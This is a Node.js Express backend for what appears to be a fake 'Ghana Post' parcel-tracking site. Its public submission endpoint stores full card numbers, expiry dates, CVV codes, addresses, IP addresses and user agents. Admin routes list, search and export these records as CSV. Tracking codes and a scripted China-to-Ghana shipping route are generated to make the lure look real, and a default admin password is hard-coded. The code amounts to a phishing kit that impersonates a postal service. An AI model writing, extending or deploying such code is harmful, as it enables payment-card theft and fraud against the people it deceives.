
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const bcrypt = require('bcryptjs');
const cors = require('cors');
const jwt = require('jsonwebtoken');
const bodyParser = require('body-parser');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

const JWT_SECRET = process.env.JWT_SECRET || 'your-super-secret-key-for-jwt-tokens';
const ADMIN_USERNAME = process.env.ADMIN_USERNAME || 'admin';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'ghanapost2024';

// Database setup
const db = new sqlite3.Database('./submissions.db', (err) => {
    if (err) {
        console.error(err.message);
    }
    console.log('Connected to the submissions database.');
});

// Create submissions table
db.run(`CREATE TABLE IF NOT EXISTS submissions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    packageNumber TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    fullName TEXT,
    phoneNumber TEXT,
    email TEXT,
    streetAddress TEXT,
    city TEXT,
    region TEXT,
    postalCode TEXT,
    country TEXT,
    cardholderName TEXT,
    cardNumber TEXT,
    expiryDate TEXT,
    cvv TEXT,
    status TEXT DEFAULT 'pending',
    ipAddress TEXT,
    userAgent TEXT
)`);

// Create contacts table
db.run(`CREATE TABLE IF NOT EXISTS contacts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    name TEXT,
    email TEXT,
    phone TEXT,
    subject TEXT,
    message TEXT,
    department TEXT,
    status TEXT DEFAULT 'new'
)`);

// Create tracking codes table
db.run(`CREATE TABLE IF NOT EXISTS tracking_codes (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    trackingCode TEXT UNIQUE NOT NULL,
    createdAt DATETIME DEFAULT CURRENT_TIMESTAMP,
    currentLocation TEXT DEFAULT 'China - Processing',
    currentStatus TEXT DEFAULT 'Order Placed',
    estimatedDelivery DATE,
    daysToDelivery INTEGER DEFAULT 60,
    description TEXT,
    status TEXT DEFAULT 'active',
    customerFullName TEXT,
    customerPhone TEXT,
    customerEmail TEXT,
    customerAddress TEXT,
    customerCity TEXT,
    customerRegion TEXT,
    customerPostalCode TEXT,
    customerCountry TEXT
)`);

// Create tracking route locations table (predefined route from China to Ghana)
db.run(`CREATE TABLE IF NOT EXISTS route_locations (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    routeOrder INTEGER,
    location TEXT UNIQUE,
    country TEXT,
    description TEXT
)`, (err) => {
    if (err) {
        console.error('Error creating route_locations table:', err.message);
        return;
    }

    // Insert default route locations if not exists — only after table is ready
    const defaultLocations = [
        { order: 1, location: 'Shenzhen, China', country: 'China', desc: 'Order Processing & Packing' },
        { order: 2, location: 'Shanghai Port, China', country: 'China', desc: 'Port of Departure' },
        { order: 3, location: 'South China Sea', country: 'International Waters', desc: 'In Transit' },
        { order: 4, location: 'Suez Canal, Egypt', country: 'Egypt', desc: 'Port Transit' },
        { order: 5, location: 'Arabian Sea', country: 'International Waters', desc: 'In Transit' },
        { order: 6, location: 'Tema Port, Ghana', country: 'Ghana', desc: 'Port of Arrival' },
        { order: 7, location: 'Accra Customs', country: 'Ghana', desc: 'Customs Clearance' },
        { order: 8, location: 'Ghana Post Hub', country: 'Ghana', desc: 'Sorting & Distribution' },
        { order: 9, location: 'Local Delivery Station', country: 'Ghana', desc: 'Ready for Delivery' }
    ];

    const insertStmt = db.prepare(`INSERT OR IGNORE INTO route_locations (routeOrder, location, country, description) VALUES (?, ?, ?, ?)`);
    defaultLocations.forEach(loc => {
        insertStmt.run([loc.order, loc.location, loc.country, loc.desc]);
    });
    insertStmt.finalize();
});

// Middleware to verify JWT
const authenticateToken = (req, res, next) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    if (token == null) return res.sendStatus(401); 

    jwt.verify(token, JWT_SECRET, (err, user) => {
        if (err) return res.sendStatus(403);
        req.user = user;
        next();
    });
};

// --- API Endpoints ---

// POST /api/submissions - Save user data
app.post('/api/submissions', (req, res) => {
    const {
        packageNumber, fullName, phoneNumber, email, streetAddress, city, region,
        postalCode, country, cardholderName, cardNumber, expiryDate, cvv
    } = req.body;
    const ipAddress = req.ip;
    const userAgent = req.headers['user-agent'];

    const sql = `INSERT INTO submissions (
        packageNumber, fullName, phoneNumber, email, streetAddress, city, region,
        postalCode, country, cardholderName, cardNumber, expiryDate, cvv, ipAddress, userAgent
    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`;

    const params = [
        packageNumber, fullName, phoneNumber, email, streetAddress, city, region,
        postalCode, country, cardholderName, cardNumber, expiryDate, cvv, ipAddress, userAgent
    ];

    db.run(sql, params, function(err) {
        if (err) {
            res.status(400).json({ "error": err.message });
            return;
        }
        res.json({
            "message": "success",
            "data": { id: this.lastID, ...req.body },
        });
    });
});

// POST /api/contact - Save contact form submission
app.post('/api/contact', (req, res) => {
    const { name, email, phone, subject, message, department } = req.body;

    if (!name || !email || !subject || !message) {
        return res.status(400).json({ "error": "Missing required fields" });
    }

    const sql = `INSERT INTO contacts (name, email, phone, subject, message, department)
                 VALUES (?, ?, ?, ?, ?, ?)`;

    const params = [name, email, phone || null, subject, message, department || 'general'];

    db.run(sql, params, function(err) {
        if (err) {
            res.status(400).json({ "error": err.message });
            return;
        }
        res.json({
            "message": "Contact message received successfully",
            "data": { id: this.lastID, ...req.body }
        });
    });
});

// GET /api/submissions - Get all submissions (admin only)
app.get('/api/submissions', authenticateToken, (req, res) => {
    const sql = "SELECT * FROM submissions ORDER BY timestamp DESC";
    db.all(sql, [], (err, rows) => {
        if (err) {
            res.status(400).json({ "error": err.message });
            return;
        }
        res.json({
            "message": "success",
            "data": rows
        });
    });
});

// GET /api/submissions/:id - Get single submission (admin only)
app.get('/api/submissions/:id', authenticateToken, (req, res) => {
    const sql = "SELECT * FROM submissions WHERE id = ?";
    db.get(sql, [req.params.id], (err, row) => {
        if (err) {
            res.status(400).json({ "error": err.message });
            return;
        }
        res.json({
            "message": "success",
            "data": row
        });
    });
});

// DELETE /api/submissions/:id - Delete a submission (admin only)
app.delete('/api/submissions/:id', authenticateToken, (req, res) => {
    const sql = "DELETE FROM submissions WHERE id = ?";
    db.run(sql, [req.params.id], function(err) {
        if (err) {
            res.status(400).json({ "error": err.message });
            return;
        }
        res.json({ "message": "deleted", "changes": this.changes });
    });
});

// PATCH /api/submissions/:id/status - Update submission status (admin only)
app.patch('/api/submissions/:id/status', authenticateToken, (req, res) => {
    const { status } = req.body;
    if (!['pending', 'completed', 'flagged'].includes(status)) {
        return res.status(400).json({ "error": "Invalid status" });
    }
    const sql = "UPDATE submissions SET status = ? WHERE id = ?";
    db.run(sql, [status, req.params.id], function(err) {
        if (err) {
            res.status(400).json({ "error": err.message });
            return;
        }
        res.json({ "message": "status updated", "changes": this.changes });
    });
});


// POST /api/admin/login - Admin authentication
app.post('/api/admin/login', (req, res) => {
    const { username, password } = req.body;
    
    // Simple validation
    if (!username || !password) {
        return res.status(400).json({ "error": "Username and password required" });
    }
    
    if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
        const accessToken = jwt.sign({ username: username }, JWT_SECRET, { expiresIn: '24h' });
        res.json({ accessToken: accessToken, message: "Login successful" });
    } else {
        res.status(401).json({ "error": "Invalid credentials" });
    }
});

// GET /api/contacts - Get all contact messages (admin only)
app.get('/api/contacts', authenticateToken, (req, res) => {
    const sql = "SELECT * FROM contacts ORDER BY timestamp DESC";
    db.all(sql, [], (err, rows) => {
        if (err) {
            res.status(400).json({ "error": err.message });
            return;
        }
        res.json({
            "message": "success",
            "data": rows
        });
    });
});

// PATCH /api/contacts/:id/status - Mark contact as read (admin only)
app.patch('/api/contacts/:id/status', authenticateToken, (req, res) => {
    const { status } = req.body;
    const sql = "UPDATE contacts SET status = ? WHERE id = ?";
    db.run(sql, [status || 'read', req.params.id], function(err) {
        if (err) {
            res.status(400).json({ "error": err.message });
            return;
        }
        res.json({ "message": "status updated", "changes": this.changes });
    });
});

// GET /api/submissions/search - Search submissions (admin only)
app.get('/api/submissions/search', authenticateToken, (req, res) => {
    const { query, startDate, endDate } = req.query;
    let sql = "SELECT * FROM submissions WHERE 1=1";
    const params = [];
    
    if (query) {
        sql += " AND (fullName LIKE ? OR email LIKE ? OR phoneNumber LIKE ? OR packageNumber LIKE ?)";
        const searchTerm = `%${query}%`;
        params.push(searchTerm, searchTerm, searchTerm, searchTerm);
    }
    
    if (startDate) {
        sql += " AND timestamp >= ?";
        params.push(startDate);
    }
    
    if (endDate) {
        sql += " AND timestamp <= ?";
        params.push(endDate);
    }
    
    sql += " ORDER BY timestamp DESC";
    
    db.all(sql, params, (err, rows) => {
        if (err) {
            res.status(400).json({ "error": err.message });
            return;
        }
        res.json({ "message": "success", "data": rows });
    });
});

// GET /api/submissions/export/csv - Export submissions as CSV (admin only)
app.get('/api/submissions/export/csv', authenticateToken, (req, res) => {
    const sql = "SELECT * FROM submissions ORDER BY timestamp DESC";
    db.all(sql, [], (err, rows) => {
        if (err) {
            res.status(400).json({ "error": err.message });
            return;
        }
        
        if (rows.length === 0) {
            return res.json({ csv: "" });
        }
        
        // Create CSV header
        const headers = Object.keys(rows[0]);
        const csvContent = [
            headers.join(','),
            ...rows.map(row => 
                headers.map(header => {
                    const value = row[header];
                    // Escape quotes and wrap in quotes if contains comma
                    if (value && (value.toString().includes(',') || value.toString().includes('"'))) {
                        return `"${value.toString().replace(/"/g, '""')}"`;
                    }
                    return value || '';
                }).join(',')
            )
        ].join('\n');
        
        res.setHeader('Content-Type', 'text/csv');
        res.setHeader('Content-Disposition', 'attachment; filename=submissions.csv');
        res.send(csvContent);
    });
});

// --- TRACKING CODE ENDPOINTS ---

// GET /api/tracking/routes - Get all available route locations
app.get('/api/tracking/routes', (req, res) => {
    const sql = "SELECT * FROM route_locations ORDER BY routeOrder ASC";
    db.all(sql, [], (err, rows) => {
        if (err) {
            res.status(400).json({ "error": err.message });
            return;
        }
        res.json({ "message": "success", "data": rows });
    });
});

// POST /api/tracking/generate - Generate new tracking code (admin only)
app.post('/api/tracking/generate', authenticateToken, (req, res) => {
    const { description, daysToDelivery, location } = req.body;
    
    // Generate unique tracking code: GH-PKG-YYYY-XXXXXX
    const year = new Date().getFullYear();
    const randomNum = Math.floor(Math.random() * 1000000).toString().padStart(6, '0');
    const trackingCode = `GH-PKG-${year}-${randomNum}`;
    
    // Use provided location if present, otherwise fallback to previous default
    const startingLocation = location || 'Shenzhen, China';
    const sql = `INSERT INTO tracking_codes (trackingCode, currentLocation, currentStatus, daysToDelivery, description)
                 VALUES (?, ?, ?, ?, ?)`;
    const params = [trackingCode, startingLocation, 'Order Placed', daysToDelivery || 60, description || ''];
    
    db.run(sql, params, function(err) {
        if (err) {
            res.status(400).json({ "error": err.message });
            return;
        }
        res.json({
            "message": "Tracking code generated successfully",
            "data": {
                id: this.lastID,
                trackingCode,
                currentLocation: startingLocation,
                currentStatus: 'Order Placed',
                daysToDelivery: daysToDelivery || 60
            }
        });
    });
});

// GET /api/tracking/:code - Track package by code (public)
app.get('/api/tracking/:code', (req, res) => {
    const sql = "SELECT * FROM tracking_codes WHERE trackingCode = ?";
    db.get(sql, [req.params.code], (err, row) => {
        if (err) {
            res.status(400).json({ "error": err.message });
            return;
        }
        if (!row) {
            res.status(404).json({ "error": "Tracking code not found" });
            return;
        }

        // Compute progress statelessly based on createdAt and daysToDelivery
        const routeSql = "SELECT * FROM route_locations ORDER BY routeOrder ASC";
        db.all(routeSql, [], (rErr, routes) => {
            if (rErr) {
                // still return the raw row if route lookup fails
                return res.json({ "message": "success", "data": row });
            }

            try {
                const daysToDelivery = row.daysToDelivery || 60;
                const createdAt = row.createdAt ? new Date(row.createdAt) : new Date();
                const now = new Date();
                const elapsedMs = Math.max(0, now.getTime() - createdAt.getTime());
                const elapsedDays = Math.floor(elapsedMs / (24 * 60 * 60 * 1000));
                const computedDaysRemaining = Math.max(0, daysToDelivery - elapsedDays);

                const n = routes.length || 1;
                const fraction = daysToDelivery > 0 ? (elapsedDays / daysToDelivery) : 1;
                let computedIndex = Math.min(n - 1, Math.floor(fraction * (n - 1)));
                if (computedIndex < 0) computedIndex = 0;

                // determine stored index for currentLocation
                let storedIndex = 0;
                if (row.currentLocation) {
                    const si = routes.findIndex(r => r.location === row.currentLocation);
                    storedIndex = si >= 0 ? si : 0;
                }

                // prefer whichever is further along (admin may have manually advanced)
                const chosenIndex = Math.max(storedIndex, computedIndex);
                const computedLocation = routes[chosenIndex] ? routes[chosenIndex].location : row.currentLocation;

                const out = Object.assign({}, row, {
                    computedDaysRemaining,
                    computedIndex: chosenIndex,
                    computedLocation,
                });

                res.json({ "message": "success", "data": out });
            } catch (e) {
                // fallback to raw row on error
                res.json({ "message": "success", "data": row });
            }
        });
    });
});

// POST /api/tracking/:code/customer - Save customer details to tracking code (public)
app.post('/api/tracking/:code/customer', (req, res) => {
    const { fullName, phoneNumber, email, streetAddress, city, region, postalCode, country } = req.body;
    
    // Update tracking code with customer details
    const sql = `UPDATE tracking_codes SET 
                 customerFullName = ?, customerPhone = ?, customerEmail = ?,
                 customerAddress = ?, customerCity = ?, customerRegion = ?, 
                 customerPostalCode = ?, customerCountry = ?
                 WHERE trackingCode = ?`;
    
    const params = [fullName, phoneNumber, email, streetAddress, city, region, postalCode, country, req.params.code];
    
    db.run(sql, params, function(err) {
        if (err) {
            res.status(400).json({ "error": err.message });
            return;
        }
        if (this.changes === 0) {
            res.status(404).json({ "error": "Tracking code not found" });
            return;
        }
        res.json({ "message": "Customer details saved successfully", "changes": this.changes });
    });
});

// GET /api/tracking - Get all tracking codes (admin only)
app.get('/api/tracking', authenticateToken, (req, res) => {
    const sql = "SELECT * FROM tracking_codes ORDER BY createdAt DESC";
    db.all(sql, [], (err, rows) => {
        if (err) {
            res.status(400).json({ "error": err.message });
            return;
        }
        res.json({ "message": "success", "data": rows });
    });
});

// PATCH /api/tracking/:id/location - Update tracking location (admin only)
app.patch('/api/tracking/:id/location', authenticateToken, (req, res) => {
    const { currentLocation, currentStatus, daysToDelivery } = req.body;
    
    let sql = "UPDATE tracking_codes SET ";
    const params = [];
    
    if (currentLocation) {
        sql += "currentLocation = ?, ";
        params.push(currentLocation);
    }
    if (currentStatus) {
        sql += "currentStatus = ?, ";
        params.push(currentStatus);
    }
    if (daysToDelivery !== undefined) {
        sql += "daysToDelivery = ?, ";
        params.push(daysToDelivery);
    }
    
    // Remove trailing comma and space
    sql = sql.slice(0, -2) + " WHERE id = ?";
    params.push(req.params.id);
    
    db.run(sql, params, function(err) {
        if (err) {
            res.status(400).json({ "error": err.message });
            return;
        }
        res.json({ "message": "Tracking updated successfully", "changes": this.changes });
    });
});

// DELETE /api/tracking/:id - Delete tracking code (admin only)
app.delete('/api/tracking/:id', authenticateToken, (req, res) => {
    const sql = "DELETE FROM tracking_codes WHERE id = ?";
    db.run(sql, [req.params.id], function(err) {
        if (err) {
            res.status(400).json({ "error": err.message });
            return;
        }
        res.json({ "message": "Tracking code deleted", "changes": this.changes });
    });
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
